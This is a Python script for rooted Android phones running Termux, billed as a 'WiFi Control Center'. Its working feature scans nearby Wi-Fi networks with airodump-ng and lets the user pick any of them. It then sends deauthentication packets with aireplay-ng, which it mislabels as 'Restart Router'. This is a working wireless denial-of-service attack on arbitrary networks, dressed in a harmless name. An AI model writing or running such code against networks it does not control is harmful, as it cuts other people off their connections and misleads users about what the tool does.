#!/data/data/com.termux/files/usr/bin/python

import os
import time
import json
import subprocess
import argparse
from datetime import datetime

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    """Clear terminal screen"""
    os.system('clear')

def print_banner():
    """Print cool ASCII art banner"""
    banner = f"""{Colors.CYAN}
╔══════════════════════════════════════════╗
║     {Colors.YELLOW}▀▛▘  ▗  ▗▜▘▗     {Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▞▀▖▄ ▄▐ ▐ ▄ ▄▌▗▘{Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▌ ▌▐ ▐▐ ▐ ▐ ▛▌▜ {Colors.CYAN}                   ║
║     {Colors.YELLOW}▘▝▀ ▀▄▀▐▄▟▖▀▄▝▘▀▘{Colors.CYAN}                   ║
║        {Colors.BLUE}WiFi Control Center{Colors.CYAN}                  ║
╚══════════════════════════════════════════╝{Colors.RESET}"""
    print(banner)

def check_root():
    """Check if Termux has root access"""
    try:
        result = subprocess.run(['su', '-c', 'whoami'], 
                              capture_output=True, 
                              text=True)
        return result.stdout.strip() == 'root'
    except:
        return False

def check_aircrack():
    """Check if aircrack-ng is installed"""
    try:
        subprocess.run(['aircrack-ng', '--help'], 
                      capture_output=True)
        return True
    except FileNotFoundError:
        return False

def install_requirements():
    """Install required packages"""
    try:
        print(f"\n{Colors.YELLOW}Installing required packages...{Colors.RESET}")
        subprocess.run(['pkg', 'install', 'root-repo'], check=True)
        subprocess.run(['pkg', 'install', 'aircrack-ng'], check=True)
        return True
    except:
        print(f"{Colors.RED}Failed to install packages{Colors.RESET}")
        return False

def get_interface():
    """Get wireless interface name"""
    try:
        result = subprocess.run(['su', '-c', 'ip link show'], 
                              capture_output=True, 
                              text=True)
        for line in result.stdout.split('\n'):
            if 'wlan' in line:
                return line.split(':')[1].strip()
        return None
    except:
        return None

def deauth_network(interface, target_bssid, channel):
    """Send deauth packets to restart network"""
    try:
        # Put interface in monitor mode
        subprocess.run(['su', '-c', f'airmon-ng start {interface}'], check=True)
        monitor_interface = f"{interface}mon"
        
        # Set channel
        subprocess.run(['su', '-c', f'iwconfig {monitor_interface} channel {channel}'], check=True)
        
        print(f"\n{Colors.YELLOW}Sending deauth packets...{Colors.RESET}")
        
        # Send deauth packets
        deauth_cmd = f'aireplay-ng --deauth 10 -a {target_bssid} {monitor_interface}'
        subprocess.run(['su', '-c', deauth_cmd], check=True)
        
        # Put interface back in managed mode
        subprocess.run(['su', '-c', f'airmon-ng stop {monitor_interface}'], check=True)
        
        return True
    except Exception as e:
        print(f"{Colors.RED}Error during deauth: {str(e)}{Colors.RESET}")
        return False

def scan_networks():
    """Scan for available networks"""
    interface = get_interface()
    if not interface:
        print(f"{Colors.RED}No wireless interface found{Colors.RESET}")
        return None
        
    try:
        # Start monitor mode
        subprocess.run(['su', '-c', f'airmon-ng start {interface}'], check=True)
        monitor_interface = f"{interface}mon"
        
        print(f"\n{Colors.YELLOW}Scanning for networks...{Colors.RESET}")
        
        # Scan for networks
        result = subprocess.run(['su', '-c', f'airodump-ng {monitor_interface} --output-format csv --write /tmp/scan --write-interval 1'],
                              capture_output=True,
                              timeout=10)
        
        # Read scan results
        with open('/tmp/scan-01.csv', 'r') as f:
            networks = []
            for line in f:
                if 'BSSID' not in line and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        networks.append({
                            'bssid': parts[0].strip(),
                            'channel': parts[3].strip(),
                            'ssid': parts[13].strip()
                        })
        
        # Clean up
        subprocess.run(['su', '-c', 'rm /tmp/scan*'], check=True)
        subprocess.run(['su', '-c', f'airmon-ng stop {monitor_interface}'], check=True)
        
        return networks
    except Exception as e:
        print(f"{Colors.RED}Error during scan: {str(e)}{Colors.RESET}")
        return None

def print_networks(networks):
    """Print available networks"""
    if not networks:
        print(f"\n{Colors.RED}No networks found{Colors.RESET}")
        return
        
    print(f"\n{Colors.BOLD}Available Networks:{Colors.RESET}")
    for i, net in enumerate(networks, 1):
        print(f"{i}. {Colors.GREEN}{net['ssid']}{Colors.RESET} ({net['bssid']}) - Channel {net['channel']}")

def restart_router():
    """Restart router using deauth packets"""
    if not check_root():
        print(f"\n{Colors.RED}⚠️ Root access required!{Colors.RESET}")
        print(f"{Colors.YELLOW}Please run Termux with root access{Colors.RESET}")
        return
        
    if not check_aircrack():
        print(f"\n{Colors.YELLOW}aircrack-ng not found. Installing...{Colors.RESET}")
        if not install_requirements():
            return
    
    # Scan for networks
    networks = scan_networks()
    if not networks:
        return
        
    print_networks(networks)
    
    try:
        choice = int(input(f"\n{Colors.BOLD}Choose network to restart (1-{len(networks)}): {Colors.RESET}")) - 1
        if 0 <= choice < len(networks):
            target = networks[choice]
            interface = get_interface()
            
            if deauth_network(interface, target['bssid'], target['channel']):
                print(f"\n{Colors.GREEN}✅ Network restart attempt completed{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}❌ Failed to restart network{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}Invalid choice!{Colors.RESET}")
    except ValueError:
        print(f"\n{Colors.RED}Invalid input!{Colors.RESET}")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Operation cancelled{Colors.RESET}")

def print_menu():
    """Print interactive menu"""
    print(f"\n{Colors.BOLD}Options:{Colors.RESET}")
    print(f"1. {Colors.GREEN}Restart Router (requires root){Colors.RESET}")
    print(f"2. {Colors.YELLOW}Show WiFi Info{Colors.RESET}")
    print(f"3. {Colors.BLUE}Monitor Signal{Colors.RESET}")
    print(f"4. {Colors.RED}Exit{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='WiFi Control Center')
    parser.add_argument('-f', '--force', action='store_true', 
                       help='Force restart without confirmation')
    args = parser.parse_args()
    
    try:
        while True:
            clear_screen()
            print_banner()
            print_menu()
            
            choice = input(f"\n{Colors.BOLD}Choose an option (1-4):{Colors.RESET} ")
            
            if choice == '1':
                restart_router()
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '2':
                print(f"\n{Colors.YELLOW}WiFi info feature coming soon...{Colors.RESET}")
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '3':
                print(f"\n{Colors.YELLOW}Signal monitoring feature coming soon...{Colors.RESET}")
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '4':
                print(f"\n{Colors.GREEN}Goodbye!{Colors.RESET}")
                break
            else:
                print(f"\n{Colors.RED}Invalid option!{Colors.RESET}")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")

if __name__ == "__main__":
    main()
